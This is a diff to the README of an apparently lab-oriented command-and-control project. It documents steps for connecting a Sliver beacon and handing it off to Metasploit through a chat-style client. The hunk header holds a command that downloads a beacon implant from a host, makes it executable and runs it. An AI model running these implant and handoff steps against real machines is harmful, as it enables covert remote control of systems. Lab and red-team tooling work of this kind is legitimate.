@@ -106,8 +106,24 @@ curl -O http://10.1.1.2:8080/testbeacon && chmod +x testbeacon && sudo service a
 
 Check the sliver-client terminal to see the beacon connection.
 
-#### Lastly, run main.py for simultaneous Metasploit and Sliver behavior
-In the third terminal with the http server, ctrl-c once the GET request is made and run the following in workspace#:
+#### Stop Python Server in Third Terminal
+In the third terminal with the http server, ctrl-c once the GET request is made
+
+#### Get the Sliver Beacon ID
+In the Ender client, get the Sliver Beacon ID
+```bash
+Enter message (or 'quit' to exit): get-sliver-beacons
+```
+
+#### Use the Sliver Beacon ID to Hand it off to Metasploit
+Using the most recent Beacon ID, hand off the beacon to Metasploit
+```bash
+Enter message (or 'quit' to exit): sliver {beacon_id} handoff_to_metasploit
+```
+Monitor the handoff in the Sliver server to verify that the handoff is successful
+
+#### Optional, run main.py for simultaneous Metasploit and Sliver behavior
+Run the following in workspace#:
 ```bash 
 python src/main.py
 ```
